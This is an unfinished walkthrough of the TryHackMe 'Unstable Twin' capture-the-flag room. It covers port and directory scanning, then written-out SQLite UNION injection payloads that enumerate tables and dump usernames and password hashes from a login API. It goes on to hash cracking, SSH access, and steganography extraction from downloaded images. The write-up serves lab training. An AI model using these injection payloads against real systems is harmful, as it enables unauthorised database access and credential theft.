***STILL N THE WORKS!***

Room: [Unstable Twin](https://tryhackme.com/room/unstabletwin)

Difficulty: Medium

Overview:



-------------------------------------------------------------------------------------------------------------------------------------------------------------------

First we will start off our target enumeration by doing "Nmap" scan:

nmap -sV -sC -A -p- 10.10.121.127 -oN nmap.txt -T4

10.10.121.127 - room ip address

![nmap](https://user-images.githubusercontent.com/76821053/119569292-74feab80-bda6-11eb-94d8-abcdc12f2fa0.png)

There are two ports open:

22    →  OpenSSH 8.0

53    →  http server nginx 1.14.1

Lets check for hidden directories with a "Gobuster" scan:

![gobuster](https://user-images.githubusercontent.com/76821053/119570948-a8dad080-bda8-11eb-9959-bbf3511f6684.png)

The website doesn't have anything..

![emptyweb](https://user-images.githubusercontent.com/76821053/119571098-d9bb0580-bda8-11eb-8dfe-9c5d55e7122c.png)

It is empty, besides the /info directory i found with gobuster:

![webinfo](https://user-images.githubusercontent.com/76821053/119571268-0d962b00-bda9-11eb-9135-8e63697dd282.png)

Using "curl" we will try to get more information from the http headers:

![curlxgetcensored](https://user-images.githubusercontent.com/76821053/120239125-8a1b8480-c255-11eb-999d-10672b662826.png)

Found the build version number for Vincent server.

Since there was a json file in the directory i did a GET request with option -H to accept application/json:

![jsonfilecurl](https://user-images.githubusercontent.com/76821053/120120298-3432d800-c194-11eb-9f09-3058d585b789.png)

Found a new build number and a new server name.

Now the room hinted that the server is vulnerable to sql injection, we need to find a way point to exploit it.

The server talks about “login API” so we'll try to see if there is anykind of vulnerability there:

![logincurlapi](https://user-images.githubusercontent.com/76821053/120239642-9ce28900-c256-11eb-8eeb-361c406f31c8.png)

We now know that /api/login can be reached and that if we ran the command 2 times it gives us different ouputs. Meaning that there is 2 servers running, probably they read from diferent builds.

To start testing for vulnerabilities we can use a simple python script using a UNION sql injection. 

Github [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)  source:

![sqlunion](https://user-images.githubusercontent.com/76821053/120239998-707b3c80-c257-11eb-84ba-f016df12bf3d.png)

Script:

![pythonscript](https://user-images.githubusercontent.com/76821053/120240176-d7005a80-c257-11eb-8b9f-371341528f30.png)


We can start editing the script doing:
```bash
1' UNION SELECT 1--+ '"
1' UNION SELECT 1,2--+ '"
1' UNION SELECT 1,2,3--+ '"
1' UNION SELECT 1,2,3,4--+ '"
```
Till we got some kind of response from the server we keep adding numbers.. even dough the server was not ouputing errors.

I kept running the script and got a response from the database:

![execpython](https://user-images.githubusercontent.com/76821053/120240529-aec52b80-c258-11eb-97e1-024ccba1db80.png)

Remember we have to run the script twice, because there's two servers.

From the result of the scipt above we can see that the server has 2 tables. Now we need to find their names.

![sqlitepayloadall](https://user-images.githubusercontent.com/76821053/120242534-fa79d400-c25c-11eb-9a76-00d71bacf4f6.png)


To display the names of the tables i used the Integer/string based - Extract table name from PayloadAllTheThings.

payload = ["1' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--+ '"]

When combining the new string injection we needed to had number 1, like so:

original: 
```bash
SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```
Modified:
```bash
SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```
Since we using a UNION based injection we can merged the strings like so:
```bash
1' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--+ '
```
We can also create a for loop so we don't have to do the request two times by reruning the script . 

![loopscript](https://user-images.githubusercontent.com/76821053/120242093-fbf6cc80-c25b-11eb-9ae6-4308906dd1f1.png)

![execloop](https://user-images.githubusercontent.com/76821053/120242201-38c2c380-c25c-11eb-8747-22895475d741.png)

Now to read the contents of the tables we will again modify the script and to be able to read the columns:

![readcontentoftables](https://user-images.githubusercontent.com/76821053/120242376-a373ff00-c25c-11eb-9743-a6932e7552d8.png)


Modifying the string:

original:
```bash
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```
merged:
```bash 
1' UNION SELECT 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--+ '
```
Added the 1, and substitute the ‘table_name’ for the users which was the 1 table name


![scriptsql](https://user-images.githubusercontent.com/76821053/122590547-9ecf8900-d059-11eb-9eaa-369f25ef36ef.png)

![runscript](https://user-images.githubusercontent.com/76821053/122590626-b9a1fd80-d059-11eb-8418-005172359fdf.png)


With this information we can now reach its contents.

To list users and passwords:
```bash
UNION SELECT username, password FROM users
```
then merged in the script:
```bash
1' UNION SELECT username, password FROM users--+
```

![listuserscipt](https://user-images.githubusercontent.com/76821053/122590901-16051d00-d05a-11eb-9488-81e691f28d4a.png)

![runscriptcolour](https://user-images.githubusercontent.com/76821053/122591066-549ad780-d05a-11eb-8378-20c6915800f1.png)

Now the same process to read the contents of "notes":

original:
```bash
SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'
```
merged:
```bash
1' UNION SELECT 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='notes'--+
```

![nano_script_notes](https://user-images.githubusercontent.com/76821053/122591587-118d3400-d05b-11eb-8ad7-4e974b8fb93c.png)

![run_script_notes](https://user-images.githubusercontent.com/76821053/122591683-32558980-d05b-11eb-9005-68cdc76e2e40.png)


To extract information:

string:
```bash
SELECT notes FROM notes
```
merged:
```bash
1' UNION SELECT 1, notes FROM notes--+
```

![nano_script_notes_dump](https://user-images.githubusercontent.com/76821053/122591774-5add8380-d05b-11eb-9b11-ff7ad3469be3.png)

![run_script_note_dump](https://user-images.githubusercontent.com/76821053/122591861-79dc1580-d05b-11eb-93b2-ba317e20ae1e.png)


Found a password:
```bash
eaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe2......7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4
```
To see what type of hash we have here we can use "hash-identifier":

![hash_identifier](https://user-images.githubusercontent.com/76821053/122591953-95472080-d05b-11eb-92ad-111758d9a2fa.png)


We can now start john the ripper to decrypt the hash:

![john](https://user-images.githubusercontent.com/76821053/122592258-f66ef400-d05b-11eb-946b-36b9fcad4f82.png)


You could also use crackstation.net to do this:

![crackstation](https://user-images.githubusercontent.com/76821053/122592285-ff5fc580-d05b-11eb-8297-a5373e5a8c28.png)


Now that we have a password we'll use ssh to connect to the target machine.

Assuming the user for this password is mary_ann, because when enumerating the server mary_ann didn't had a colour but instead a "..continue.." information.

![ssh_mary](https://user-images.githubusercontent.com/76821053/122592544-506fb980-d05c-11eb-9d86-71d9abef4aec.png)

I ran linpeas, did manual enumeration and only found a clue:

![clue_server](https://user-images.githubusercontent.com/76821053/122592648-7ac17700-d05c-11eb-835d-839f5539d277.png)


The content of server_notes.txt:

![server_notes](https://user-images.githubusercontent.com/76821053/122592681-86ad3900-d05c-11eb-98ce-60d7d8181a21.png)

The api must have more information hidden,lets use curl to try and download the images hinted on the message for every user:
```bash
curl -v http://unstabletwin.thm/get_image?name=vincent --output user.jpg 
```

![curl_vincent](https://user-images.githubusercontent.com/76821053/122592933-db50b400-d05c-11eb-8c43-45414834875f.png)

![curl_julias](https://user-images.githubusercontent.com/76821053/122592964-e4418580-d05c-11eb-8d4a-28b1b06594a5.png)

![curl_marnie](https://user-images.githubusercontent.com/76821053/122592996-ee638400-d05c-11eb-92bd-e7d3b503061b.png)

![curl_linda](https://user-images.githubusercontent.com/76821053/122593033-f9b6af80-d05c-11eb-8b01-d1a2e2b904d6.png)

![curl_mary_ann](https://user-images.githubusercontent.com/76821053/122593061-04714480-d05d-11eb-8ea1-b61d590084e6.png)

Do this command for every user and download all the files in .jpg format.

example images:

![example_image](https://user-images.githubusercontent.com/76821053/122593125-1eab2280-d05d-11eb-92c0-23817a83351b.png)


Since they were all images i used steghide to see if there was any hidden content and i was right:

![steghide](https://user-images.githubusercontent.com/76821053/122593212-40a4a500-d05d-11eb-88a6-e27c199ae54c.png)


Reading the contents of each extracted files:

![contents_steg](https://user-images.githubusercontent.com/76821053/122593376-7b0e4200-d05d-11eb-84c4-1d29a3efa5e9.png)


There was a tip about arranging the children by the colours of the rainbow.

![ROYGBIV](https://user-images.githubusercontent.com/76821053/122593432-9416f300-d05d-11eb-8fcc-6727920b2f8d.png)


So we need to merge the contents of each extracted file into a big string and order it by the rainbow colours from red to green:
```bash
1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSwjKLNAAeCdl2J8BCRuXVXeVYvs6J6HKpZWPG8pfeHoNG1
```
After trying many different decoders i found that the string is base62. So we can use the decoder at https://gchq.github.io/CyberChef/:

![cyberchef](https://user-images.githubusercontent.com/76821053/122594054-6e3e1e00-d05e-11eb-83e7-1fd043ae367e.png)


